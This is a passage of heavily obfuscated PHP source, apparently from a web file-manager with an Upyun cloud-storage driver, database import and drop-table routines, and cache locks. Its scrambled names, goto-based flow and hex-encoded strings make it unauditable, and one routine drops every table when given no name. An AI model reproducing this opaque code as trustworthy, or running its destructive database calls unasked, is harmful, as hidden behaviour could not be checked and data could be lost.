implode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][983], $Eƒ„à…®¶¦) . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][984]; fwrite($c•˜‡À¢àŞ, $döà¿¼¯¿ç . implode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][985], $aˆ¶›™¬Ô×) . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][67] . PHP_EOL); $cãò—“Ø…Ö++; $e•ˆóé‚—Å += $a²‹†æ«; if ($BÒ‡˜…ø³») { $BÒ‡˜…ø³»->update($a²‹†æ«); } } while ($cãò—“Ø…Ö <= $B³‹ªâ¶‚); goto aõƒ…Ó»¢ï; bÑ†Æ‘‰Ì: if ($BÒ‡˜…ø³») { $BÒ‡˜…ø³»->task[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][975]] = $AÄ÷ì«âÍ¥; } $B™²Á–Ù = $this->model($AÄ÷ì«âÍ¥); $e•ˆóé‚—Å = 0; goto f¤»°Ùİ®Í; aõƒ…Ó»¢ï: fclose($c•˜‡À¢àŞ); return $e•ˆóé‚—Å; goto DîßÅŠç§Î; f¤»°Ùİ®Í: $cãò—“Ø…Ö = 1; $c¶Ÿ‹ÈŞ·¯ = 500; $c•˜‡À¢àŞ = fopen($e“Şª…¢Ä, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][977]); goto C¥Á½™ôÇ¨; DîßÅŠç§Î: } public function sqlToDb($A¶‡ÆØ, $ešµÅ¤¡Ã = null) { goto d¹Êè­ìŠñ; EÈ®ÅÃŒçÂ: $AÚĞ®ÙÒî = 500 + 1; while (!feof($fõ©Ã¾¾ï)) { if ($ešµÅ¤¡Ã && $EÔ§¤ˆÇ¾† != 0) { $ešµÅ¤¡Ã->task[$AÌ»œöÜÙ[973]] += 1; } $EÔ§¤ˆÇ¾†++; $FÑì×ÚÛ¤ = trim(fgets($fõ©Ã¾¾ï)); $e†‹×­¤²Ú .= $AÌ»œöÜÙ[50] . $this->sqlDecode($FÑì×ÚÛ¤, $this->type); if ($EÔ§¤ˆÇ¾† == $AÚĞ®ÙÒî) { $e†‹×­¤²Ú = rtrim(trim($e†‹×­¤²Ú), $AÌ»œöÜÙ[67]); if (!$Eó‚ÜÚÆ µ->execute($e†‹×­¤²Ú)) { return !1; } if ($ešµÅ¤¡Ã) { $ešµÅ¤¡Ã->update($EÔ§¤ˆÇ¾† - 1); } $e†‹×­¤²Ú = $AÌ»œöÜÙ[33]; $EÔ§¤ˆÇ¾† = 0; } } fclose($fõ©Ã¾¾ï); goto D´ìİƒ–Ä‹; A‹ìàÚñÙã: if (!$fõ©Ã¾¾ï) { return !1; } $EÔ§¤ˆÇ¾† = 0; $e†‹×­¤²Ú = $AÌ»œöÜÙ[33]; goto EÈ®ÅÃŒçÂ; D´ìİƒ–Ä‹: if (trim($e†‹×­¤²Ú)) { $e†‹×­¤²Ú = rtrim(trim($e†‹×­¤²Ú), $AÌ»œöÜÙ[67]); if (!$Eó‚ÜÚÆ µ->execute($e†‹×­¤²Ú)) { return !1; } if ($ešµÅ¤¡Ã) { $ešµÅ¤¡Ã->update($EÔ§¤ˆÇ¾† - 1); } } return !0; goto EìêÎèä; d¹Êè­ìŠñ: $AÌ»œöÜÙ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eó‚ÜÚÆ µ = $this->model()->db(); $fõ©Ã¾¾ï = @fopen($A¶‡ÆØ, $AÌ»œöÜÙ[986]); goto A‹ìàÚñÙã; EìêÎèä: } public function dropTable($fõÃ¢Éæ¿Ò = null) { $d³Ó…ŠªÁ = $this->model()->db(); $F¦Şô—œ = $fõÃ¢Éæ¿Ò ? array($fõÃ¢Éæ¿Ò) : $d³Ó…ŠªÁ->getTables(); if (!$F¦Şô—œ) { return; } foreach ($F¦Şô—œ as $fõÃ¢Éæ¿Ò) { $d³Ó…ŠªÁ->execute("\x64\x72\157\x70\40\164\x61\x62\154\145\x20\151\146\x20\145\170\x69\x73\164\x73\x20\x60{$fõÃ¢Éæ¿Ò}\140"); } } private function taskToCache($FÁİ²£ØÕä = null) { $aæ½²¹×¯ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$FÁİ²£ØÕä) { return; } $eˆ·ˆ†²× = array($aæ½²¹×¯ï[975] => $FÁİ²£ØÕä->task[$aæ½²¹×¯ï[975]], $aæ½²¹×¯ï[973] => $FÁİ²£ØÕä->task[$aæ½²¹×¯ï[973]], $aæ½²¹×¯ï[987] => $FÁİ²£ØÕä->task[$aæ½²¹×¯ï[987]]); if ($eˆ·ˆ†²×[$aæ½²¹×¯ï[973]] == $eˆ·ˆ†²×[$aæ½²¹×¯ï[987]]) { $eˆ·ˆ†²×[$aæ½²¹×¯ï[690]] = 1; } Cache::set($aæ½²¹×¯ï[988] . $FÁİ²£ØÕä->task[$aæ½²¹×¯ï[385]], $eˆ·ˆ†²×); $FÁİ²£ØÕä->end(); } private function sqlEncode($CÊœ£êÀö¤) { $E³ÖÀÖ©²ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÎ¯äæˆ×ô = array(); foreach ($CÊœ£êÀö¤ as $C“ìßÆÄÉİ) { if (is_array($C“ìßÆÄÉİ)) { $C“ìßÆÄÉİ = json_encode_force($C“ìßÆÄÉİ); } $C“ìßÆÄÉİ = addslashes($C“ìßÆÄÉİ); $C“ìßÆÄÉİ = str_replace(array($E³ÖÀÖ©²ä[989], $E³ÖÀÖ©²ä[227]), array($E³ÖÀÖ©²ä[990], $E³ÖÀÖ©²ä[991]), $C“ìßÆÄÉİ); $eÎ¯äæˆ×ô[] = str_replace($E³ÖÀÖ©²ä[55], $E³ÖÀÖ©²ä[992], $C“ìßÆÄÉİ); } return $E³ÖÀÖ©²ä[55] . implode($E³ÖÀÖ©²ä[993], $eÎ¯äæˆ×ô) . $E³ÖÀÖ©²ä[55]; } private function sqlDecode($c½Ş‰ø‘Š“, $côĞ³ãŸ) { $B¸ìÆ¯÷¶Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c½Ş‰ø‘Š“ = str_replace(array($B¸ìÆ¯÷¶Å[990], $B¸ìÆ¯÷¶Å[991]), array($B¸ìÆ¯÷¶Å[989], $B¸ìÆ¯÷¶Å[227]), $c½Ş‰ø‘Š“); if ($côĞ³ãŸ == $B¸ìÆ¯÷¶Å[9]) { $c½Ş‰ø‘Š“ = stripslashes($c½Ş‰ø‘Š“); } return $c½Ş‰ø‘Š“; } } goto D«ŠŠÇÀé; Eë»®ß´É: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $c“…Œœà¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÁÄêƒ„½© = $GLOBALS[$c“…Œœà¬[6]][$c“…Œœà¬[345]]; self::$cachePath = $DÁÄêƒ„½©[$c“…Œœà¬[173]][$c“…Œœà¬[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e§°¢ØƒŞá, $B¡ğ÷…Ò…š = 0) { goto c­ã©«ÂÍ; c­ã©«ÂÍ: $AˆÈì‡ÇÑ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FİªÄòîÜ = microtime(!0); $a•ÛÅ¨¼’¶ = $FİªÄòîÜ + $B¡ğ÷…Ò…š + 0.0001; goto D¸¼òÚİ£ñ; E‡…¹Şœ: $this->unlock($e§°¢ØƒŞá); return !1; goto Có¨ØÙåÕ; D¸¼òÚİ£ñ: $cŸ¡’™Ùƒ = rtrim(self::$cachePath, $AˆÈì‡ÇÑ¤[8]) . $AˆÈì‡ÇÑ¤[773] . md5($e§°¢ØƒŞá) . $AˆÈì‡ÇÑ¤[770]; if (file_exists($cŸ¡’™Ùƒ) && filemtime($cŸ¡’™Ùƒ) && filemtime($cŸ¡’™Ùƒ) < time() - 10) { @unlink($cŸ¡’™Ùƒ); } do { if (file_exists($cŸ¡’™Ùƒ)) { cacheLockWait(); continue; } $f¨À·Ÿ¨œ÷ = fopen($cŸ¡’™Ùƒ, $AˆÈì‡ÇÑ¤[774]); if (!$f¨À·Ÿ¨œ÷) { return !1; } $b¦Œãİ¾ñõ = flock($f¨À·Ÿ¨œ÷, LOCK_EX | LOCK_NB); self::$caches[$e§°¢ØƒŞá] = array($AˆÈì‡ÇÑ¤[775] => $f¨À·Ÿ¨œ÷, $AˆÈì‡ÇÑ¤[173] => $cŸ¡’™Ùƒ); fwrite($f¨À·Ÿ¨œ÷, $a•ÛÅ¨¼’¶); clearstatcache(); if ($f¨À·Ÿ¨œ÷ && $b¦Œãİ¾ñõ) { return !0; } cacheLockWait(); } while (microtime(!0) < $a•ÛÅ¨¼’¶); goto E‡…¹Şœ; Có¨ØÙåÕ: } public function lockGet($BÕ®‘›Ãƒï) { $B«‘¶İ‘é­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $døÆ¹Š­­Š = rtrim(self::$cachePath, $B«‘¶İ‘é­[8]) . $B«‘¶İ‘é­[773] . md5($BÕ®‘›Ãƒï) . $B«‘¶İ‘é­[770]; return file_exists($døÆ¹Š­­Š); } public function unlock($AŠš¹´‰œÁ) { goto fòÜ¢ëÎë; Cñ·õØç¤: unset(self::$caches[$AŠš¹´‰œÁ]); goto C®×´İåãç; E¡ÕìßŸğ: @flock($dëÖ¼×Áƒã[$c¡¦§”ÀÇ²[775]], LOCK_UN); @fclose($dëÖ¼×Áƒã[$c¡¦§”ÀÇ²[775]]); @unlink($dëÖ¼×Áƒã[$c¡¦§”ÀÇ²[173]]); goto Cñ·õØç¤; fòÜ¢ëÎë: $c¡¦§”ÀÇ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dëÖ¼×Áƒã = self::$caches[$AŠš¹´‰œÁ]; if (!$dëÖ¼×Áƒã) { return; } goto E¡ÕìßŸğ; C®×´İåãç: } } class CacheLockRedis { public function lock($BèÔ©ç®èˆ, $eàˆË¬ğ²ˆ = 10) { $A™‘’Ê™ì¸ = Cache::init(); $A¦º’É¾Ê = microtime(!0) + $eàˆË¬ğ²ˆ; while (microtime(!0) < $A¦º’É¾Ê) { $fºÉ‚ÓØŠÏ = $A™‘’Ê™ì¸->get($BèÔ©ç®èˆ); if (!$fºÉ‚ÓØŠÏ) { $aÕ–Û¿í = $A™‘’Ê™ì¸->setLock($BèÔ©ç®èˆ, $A¦º’É¾Ê, $eàˆË¬ğ²ˆ); if ($aÕ–Û¿í) { return !0; } } else { if ($fºÉ‚ÓØŠÏ < microtime(!0)) { $A™‘’Ê™ì¸->set($BèÔ©ç®èˆ, $A¦º’É¾Ê, $A¦º’É¾Ê); if ($A™‘’Ê™ì¸->get($BèÔ©ç®èˆ) === $fºÉ‚ÓØŠÏ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($BçĞ±Ã®›) { return Cache::init()->get($BçĞ±Ã®›); } public function unlock($C ×Ç¸ö»İ) { return Cache::init()->remove($C ×Ç¸ö»İ); } } goto FçªÑÚ°—š; D–ºŸÛ±”: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Aœ®ÜãÀ¼¾, $C³Ã„ƒ” = 0) { parent::__construct(); $this->source = $Aœ®ÜãÀ¼¾; $this->sourceSize = $C³Ã„ƒ”; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($c—ŞäÚ«ßµ = false) { return $this->sourceSize; } public function getContent($CåäôÒÁÁ  = false) { return $this->fileSubstr($CåäôÒÁÁ , 0, $this->sourceSize); } public function fileSubstr($c¼¿Ÿ†Ø£« = false, $B¹”¼¼ŠŠ = 0, $B©øëáÁ = 0) { if (!$B©øëáÁ) { $B©øëáÁ = $this->sourceSize; } $D ËÈ³„È” = $this->sourceSize - $B¹”¼¼ŠŠ; if ($B©øëáÁ >= $D ËÈ³„È”) { $B©øëáÁ = $D ËÈ³„È”; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $B¹”¼¼ŠŠ, $B©øëáÁ); } if ($this->sourceType == self::TYPE_FILE) { if ($B©øëáÁ <= 0) { return $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33]; } $FğË¥Ë»•¥ = ftell($this->source); fseek_64($this->source, $FğË¥Ë»•¥ + $B¹”¼¼ŠŠ); $Dòˆ¬ŠƒŸé = @fread($this->source, $B©øëáÁ); fseek_64($this->source, $FğË¥Ë»•¥); return $Dòˆ¬ŠƒŸé; } } public function hashMd5($F’¿‹ÚÌ™‘ = false) { return md5($this->getContent()); } public static function hash($d¯ö¬´ˆó•, $DÚƒ¦çÚ„· = 0) { $dÎ¨ô‰¼ƒƒ = new PathDriverStream($d¯ö¬´ˆó•, $DÚƒ¦çÚ„·); return $dÎ¨ô‰¼ƒƒ->hashSimple($d¯ö¬´ˆó•); } public static function md5($DÀ£ˆ˜»¹Š, $fç¼ÑÔÖø = 0) { $Cäø¡ï¯Œç = new PathDriverStream($DÀ£ˆ˜»¹Š, $fç¼ÑÔÖø); return $Cäø¡ï¯Œç->hashMd5($DÀ£ˆ˜»¹Š); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\x2f\x2f\166\x30\56\141\x70\151\56\x75\160\171\165\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Fˆ’ù®ƒ÷) { parent::__construct(); $this->_init($Fˆ’ù®ƒ÷); } public function _init($F§†“³éôÅ) { $Fß——òÖ½Ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($F§†“³éôÅ as $BñÇª…Ó => $f–ôØÄ–øë) { if (isset($this->{$BñÇª…Ó})) { $this->{$BñÇª…Ó} = $f–ôØÄ–øë; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Fß——òÖ½Ó[1280] . LNG($Fß——òÖ½Ó[1212])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($D µ–İƒÑŒ, $BÇ‚æĞªÓ = "\x47\105\x54") { $Bˆâñíßßª =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f‰ŒàìÑÉ¹ = gmdate($Bˆâñíßßª[1246]); $C‹ ê¤‘Ç¤ = base64_encode(hash_hmac($Bˆâñíßßª[1281], "{$BÇ‚æĞªÓ}\46{$D µ–İƒÑŒ}\x26{$f‰ŒàìÑÉ¹}", md5("{$this->userpass}"), !0)); $aÅ‡À£÷” = array("\101\x75\x74\150\x6f\x72\x69\x7a\x61\164\x69\x6f\x6e\x3a\x55\x50\131\125\x4e\x20{$this->username}\72{$C‹ ê¤‘Ç¤}", "\x44\141\x74\x65\72{$f‰ŒàìÑÉ¹}"); return $aÅ‡À£÷”; } public function ussRequest($B±´‰š›ø¹, $EêŞÂµãÂŸ = "\107\x45\124", $f©¿Ò—ÅÈŸ = false, $cöñÈ¢¹«± = false, $B±ôÍ‰¦öÏ = false) { goto cÊœœÃÊ; cÊœœÃÊ: $Bºó“ƒœÎğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B±´‰š›ø¹ = trim($B±´‰š›ø¹, $Bºó“ƒœÎğ[8]); $CìßÆªÓƒ‚ = "\x2f{$this->bucket}\x2f{$B±´‰š›ø¹}"; goto AÓ–¿ĞœÜÖ; AÓ–¿ĞœÜÖ: $AÉÌË¹…ê = $this->ussHeaders($CìßÆªÓƒ‚, $EêŞÂµãÂŸ); if ($cöñÈ¢¹«±) { $AÉÌË¹…ê = array_merge($AÉÌË¹…ê, $cöñÈ¢¹«±); } $Bˆ™Š‰›öÖ = url_request($this->endpoint . $CìßÆªÓƒ‚, $EêŞÂµãÂŸ, $f©¿Ò—ÅÈŸ, $AÉÌË¹…ê, $B±ôÍ‰¦öÏ); goto c‹›»Ïõõ’; c‹›»Ïõõ’: if (!$Bˆ™Š‰›öÖ) { return array($Bºó“ƒœÎğ[1037] => !1, $Bºó“ƒœÎğ[1039] => $Bºó“ƒœÎğ[1282]); } if (strtolower($EêŞÂµãÂŸ) == $Bºó“ƒœÎğ[190] || in_array($Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[1037]], array($Bºó“ƒœÎğ[1137], $Bºó“ƒœÎğ[1283]))) { $f©¿Ò—ÅÈŸ = $Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[1284]]; } else { $f©¿Ò—ÅÈŸ = json_decode($Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[1039]], !0); if (!$f©¿Ò—ÅÈŸ) { $f©¿Ò—ÅÈŸ = $Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[1039]]; } else { if (!$Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[683]] && isset($f©¿Ò—ÅÈŸ[$Bºó“ƒœÎğ[1285]])) { $f©¿Ò—ÅÈŸ = $f©¿Ò—ÅÈŸ[$Bºó“ƒœÎğ[1285]]; } } } return array($Bºó“ƒœÎğ[1037] => $Bˆ™Š‰›öÖ[$Bºó“ƒœÎğ[683]], $Bºó“ƒœÎğ[1039] => $f©¿Ò—ÅÈŸ); goto Bù¤›ö“‘Š; Bù¤›ö“‘Š: } public function mkfile($Bğ…²–øĞ, $F’ãÂÎØˆÁ = '', $D£òññÑ˜ò = REPEAT_RENAME) { if ($this->setContent($Bğ…²–øĞ, $F’ãÂÎØˆÁ)) { return $this->getPathOuter($Bğ…²–øĞ); } return !1; } public function mkdir($c™©Ë©÷¼ß, $AŠùÁÚÀÇ† = REPEAT_SKIP) { $FÙ–‚½ŠÇÎ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b‡ìøîºÎ¢ = trim($c™©Ë©÷¼ß, $FÙ–‚½ŠÇÎ[8]); if ($this->_isFolder($b‡ìøîºÎ¢)) { return $this->getPathOuter($b‡ìøîºÎ¢); } $Eà‡ùœ¼÷© = array($FÙ–‚½ŠÇÎ[1286]); $Có™¿Ä¾«— = $this->ussRequest($b‡ìøîºÎ¢, $FÙ–‚½ŠÇÎ[222], !1, $Eà‡ùœ¼÷©); return $Có™¿Ä¾«—[$FÙ–‚½ŠÇÎ[1037]] ? $this->getPathOuter($b‡ìøîºÎ¢) : !1; } public function copyFile($FåìÈï·â, $dØ‘×Ç¬¦Ê) { $f¼Ç•‘×š« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b²´ˆº«Ê¬ = array($f¼Ç•‘×š«[1287] . "\57{$this->bucket}\x2f{$FåìÈï·â}", $f¼Ç•‘×š«[1288]); $dáÁèÑ¾Ê = $this->ussRequest($dØ‘×Ç¬¦Ê, $f¼Ç•‘×š«[224], !1, $b²´ˆº«Ê¬); return $dáÁèÑ¾Ê[$f¼Ç•‘×š«[1037]] ? !0 : $this->getPathOuter($dØ‘×Ç¬¦Ê); } public function moveFile($Bä‡½¦±×, $E ¢³‘‚Ó) { $C¯ŠÒøéÂ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eóéŞ”…Ä = array($C¯ŠÒøéÂ[1289] . "\x2f{$this->bucket}\x2f{$Bä‡½¦±×}", $C¯ŠÒøéÂ[1288]); $e‚‡ÚµİÔØ = $this->ussRequest($E ¢³‘‚Ó, $C¯ŠÒøéÂ[224], !1, $eóéŞ”…Ä); return $e‚‡ÚµİÔØ[$C¯ŠÒøéÂ[1037]] ? !0 : $this->getPathOuter($E ¢³‘‚Ó); } public function delFile($c–¡ç„¶©) { $e¢’­Çôğ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c«öĞá¤ãñ = $this->ussRequest($c–¡ç„¶©, $e¢’­Çôğ¯[1290]); return $c«öĞá¤ãñ[$e¢’­Çôğ¯[1037]] ? !0 : !1; } public function delFolder($e²™ÃŠÁ©Ü) { goto EÄÉªó‡šÃ; EÄÉªó‡šÃ: $FÌİñ¯Ä– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->exist($e²™ÃŠÁ©Ü)) { return !0; } $this->listItemCache = !1; goto Eº‡ğ® •„; Eº‡ğ® •„: $cìÆÎÏòŞï = $f·¹ÌÚ¬Çæ = array(); $this->fileList($e²™ÃŠÁ©Ü, $cìÆÎÏòŞï, $f·¹ÌÚ¬Çæ, !0); $this->listItemCache = !0; goto eõ”šôø°Œ; Eâ£ÎòŒÌ„: return $b÷·Â´µÜ†[$FÌİñ¯Ä–[1037]]; goto cõ›ƒ’›¬; eõ”šôø°Œ: foreach ($f·¹ÌÚ¬Çæ as $b»¾‹»›ù) { $b÷·Â´µÜ† = $this->ussRequest($b»¾‹»›ù[$FÌİñ¯Ä–[28]], $FÌİñ¯Ä–[1290]); if (!$b÷·Â´µÜ†[$FÌİñ¯Ä–[1037]]) { return !1; } } foreach ($cìÆÎÏòŞï as $d«°¯ÄÓ…) { $b÷·Â´µÜ† = $this->ussRequest($d«°¯ÄÓ…, $FÌİñ¯Ä–[1290]); if (!$b÷·Â´µÜ†[$FÌİñ¯Ä–[1037]]) { return !1; } } $b÷·Â´µÜ† = $this->ussRequest($e²™ÃŠÁ©Ü, $FÌİñ¯Ä–[1290]); goto Eâ£ÎòŒÌ„; cõ›ƒ’›¬: } public function rename($C¹ëéŒâğ, $dèëÇ¡îß) { if ($this->isFile($C¹ëéŒâğ)) { $dèëÇ¡îß = get_path_father($C¹ëéŒâğ) . $dèëÇ¡îß; return $this->moveFile($C¹ëéŒâğ, $dèëÇ¡îß); } return $this->renameObject($C¹ëéŒâğ, $dèëÇ¡îß); } public function fileInfo($B¾ÄéÆï“, $d°¬ƒ¡–à‚ = false, $Bä¡“ÔôÂ = array()) { goto aÉ»©§÷ˆÎ; DÔ¹œ¹Š‘: return $D»İ¢Ã›ì; goto D¨é¤í÷ÇÄ; bˆŒ¦Ë§íË: $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[192]] = $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[83]] = 0; $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[193]] = $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[194]] = !0; if (empty($Bä¡“ÔôÂ)) { $Bä¡“ÔôÂ = $this->objectMeta($B¾ÄéÆï“); if (!$Bä¡“ÔôÂ) { return $D»İ¢Ã›ì; } } goto EÚ®³¥·Ö; EÚ®³¥·Ö: $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[192]] = intval($Bä¡“ÔôÂ[$bÆ¹÷ò¼‘[1291]]); $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[83]] = intval($Bä¡“ÔôÂ[$bÆ¹÷ò¼‘[1292]]); $D»İ¢Ã›ì[$bÆ¹÷ò¼‘[77]] = $Bä¡“ÔôÂ[$bÆ¹÷ò¼‘[77]]; goto DÔ¹œ¹Š‘; aÉ»©§÷ˆÎ: $bÆ¹÷ò¼‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D»İ¢Ã›ì = array($bÆ¹÷ò¼‘[28] => $this->pathThis($B¾ÄéÆï“), $bÆ¹÷ò¼‘[75] => $this->getPathOuter($bÆ¹÷ò¼‘[8] . $B¾ÄéÆï“), $bÆ¹÷ò¼‘[29] => $bÆ¹÷ò¼‘[173], $bÆ¹÷ò¼‘[77] => isset($Bä¡“ÔôÂ[$bÆ¹÷ò¼‘[77]]) ? $Bä¡“ÔôÂ[$bÆ¹÷ò¼‘[77]] : 0, $bÆ¹÷ò¼‘[167] => $this->ext($B¾ÄéÆï“)); if ($d°¬ƒ¡–à‚) { return $D»İ¢Ã›ì; } goto bˆŒ¦Ë§íË; D¨é¤í÷ÇÄ: } public function folderInfo($fé½ÍÎƒ¤Ù, $aó»ì†ÎÅ™ = false) { goto d¼à²Å´‰; d¼à²Å´‰: $b·ã–á‚×Ú =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bØˆ§à—Ó = array($b·ã–á‚×Ú[28] => $this->pathThis($fé½ÍÎƒ¤Ù), $b·ã–á‚×Ú[75] => $this->getPathOuter($b·ã–á‚×Ú[8] . $fé½ÍÎƒ¤Ù), $b·ã–á‚×Ú[29] => $b·ã–á‚×Ú[76]); if ($aó»ì†ÎÅ™) { return $bØˆ§à—Ó; } goto aÌÒâÕ¤…œ; aÌÒâÕ¤…œ: $bØˆ§à—Ó[$b·ã–á‚×Ú[192]] = $bØˆ§à—Ó[$b·ã–á‚×Ú[83]] = 0; $bØˆ§à—Ó[$b·ã–á‚×Ú[193]] = $bØˆ§à—Ó[$b·ã–á‚×Ú[194]] = !0; if (empty($F£ÂÍÇæ©Ó)) { $F£ÂÍÇæ©Ó = $this->objectMeta($fé½ÍÎƒ¤Ù); if (!$F£ÂÍÇæ©Ó) { return $bØˆ§à—Ó; } } goto CÀ×èøÚÖ‘; CÀ×èøÚÖ‘: $bØˆ§à—Ó[$b·ã–á‚×Ú[192]] = intval($F£ÂÍÇæ©Ó[$b·ã–á‚×Ú[1291]]); $bØˆ§à—Ó[$b·ã–á‚×Ú[83]] = intval($F£ÂÍÇæ©Ó[$b·ã–á‚×Ú[1292]]); return $bØˆ§à—Ó; goto dçô„£³×; dçô„£³×: } private function listObjs($b‹¡òšÆ, $bËœ—ãĞŒ = 0, $fùù¸Ìæ­á = 1000) { $BâºÑô½Ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cë×ƒË¦¯Â = array($BâºÑô½Ç[1293], $BâºÑô½Ç[1294] . $fùù¸Ìæ­á); if ($bËœ—ãĞŒ) { $Cë×ƒË¦¯Â[] = $BâºÑô½Ç[1295] . $bËœ—ãĞŒ; } $B‚‡é°èçÏ = $this->ussRequest($b‹¡òšÆ, $BâºÑô½Ç[226], !1, $Cë×ƒË¦¯Â); return !$B‚‡é°èçÏ[$BâºÑô½Ç[1037]] ? !1 : $B‚‡é°èçÏ[$BâºÑô½Ç[1039]]; } private function fileList($Dçò«Ò‰Ìƒ, &$A‡ø®Ò±ä, &$BÓàøÃÜ, $cÍÑÓ„ƒ£¿ = false) { goto D½šÛšâÅŞ; a¢ì›â¸›è: $fÍŒ±‰ªÕÃ = rtrim($Dçò«Ò‰Ìƒ, $fÜØÖŒ†•[8]) . $fÜØÖŒ†•[8]; $F®šÚß¾Ÿ¡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $fø•Õ­Ò¶ = $this->listObjs($Dçò«Ò‰Ìƒ, $b¯›Â¢¬‡ƒ, $FÉ±¸øÌ¡‘); if (!$fø•Õ­Ò¶) { return !1; } $b¯›Â¢¬‡ƒ = isset($fø•Õ­Ò¶[$fÜØÖŒ†•[1296]]) ? $fø•Õ­Ò¶[$fÜØÖŒ†•[1296]] : $fÜØÖŒ†•[33]; $fÖÈƒÑˆóÉ = isset($fø•Õ­Ò¶[$fÜØÖŒ†•[1297]]) ? $fø•Õ­Ò¶[$fÜØÖŒ†•[1297]] : array(); foreach ($fÖÈƒÑˆóÉ as $c¶“¸‘†) { $fŞ­›ù‰”à = $c¶“¸‘†[$fÜØÖŒ†•[29]] == $fÜØÖŒ†•[76] ? !0 : !1; $b¦·¸–¡¢ª = ltrim($fÍŒ±‰ªÕÃ . $c¶“¸‘†[$fÜØÖŒ†•[28]], $fÜØÖŒ†•[8]) . ($fŞ­›ù‰”à ? $fÜØÖŒ†•[8] : $fÜØÖŒ†•[33]); $D“·ÄÓ½‰ = array($fÜØÖŒ†•[28] => $b¦·¸–¡¢ª, $fÜØÖŒ†•[29] => $fŞ­›ù‰”à ? $fÜØÖŒ†•[76] : $fÜØÖŒ†•[173], $fÜØÖŒ†•[77] => $c¶“¸‘†[$fÜØÖŒ†•[333]], $fÜØÖŒ†•[1292] => $c¶“¸‘†[$fÜØÖŒ†•[1298]]); if ($F®šÚß¾Ÿ¡) { $this->cacheMethod($fÜØÖŒ†•[197], $b¦·¸–¡¢ª, $fŞ­›ù‰”à); $this->cacheMethod($fÜØÖŒ†•[198], $b¦·¸–¡¢ª, $D“·ÄÓ½‰); } if ($fŞ­›ù‰”à) { $A‡ø®Ò±ä[] = $b¦·¸–¡¢ª; if ($cÍÑÓ„ƒ£¿) { $this->fileList($b¦·¸–¡¢ª, $A‡ø®Ò±ä, $BÓàøÃÜ, $cÍÑÓ„ƒ£¿); } continue; } $BÓàøÃÜ[] = $D“·ÄÓ½‰; } if (count($fÖÈƒÑˆóÉ) < $FÉ±¸øÌ¡‘) { break; } } goto aÈ„Ò¨¢ğ…; aÈ„Ò¨¢ğ…: if ($F®šÚß¾Ÿ¡) { $this->cacheMethod($fÜØÖŒ†•[197], $Dçò«Ò‰Ìƒ, !0); } goto a÷ˆÒ¹İë“; D½šÛšâÅŞ: $fÜØÖŒ†• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b¯›Â¢¬‡ƒ = $fÜØÖŒ†•[33]; $FÉ±¸øÌ¡‘ = 1000; goto a¢ì›â¸›è; a÷ˆÒ¹İë“: } public function listPath($cŸùŞ¦±¤, $Fé£ÍâŠÓ  = false) { $f„„ŞÒÌÖ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d”âé­Û‘ = $aÅ˜„†ã¯ = array(); $this->fileList($cŸùŞ¦±¤, $d”âé­Û‘, $aÅ˜„†ã¯); foreach ($d”âé­Û‘ as $f‹èòÔ£ => $a¤º¾“¦Î¢) { $d”âé­Û‘[$f‹èòÔ£] = $this->folderInfo($a¤º¾“¦Î¢, $Fé£ÍâŠÓ ); } foreach ($aÅ˜„†ã¯ as $f‹èòÔ£ => $a¤º¾“¦Î¢) { $aÅ˜„†ã¯[$f‹èòÔ£] = 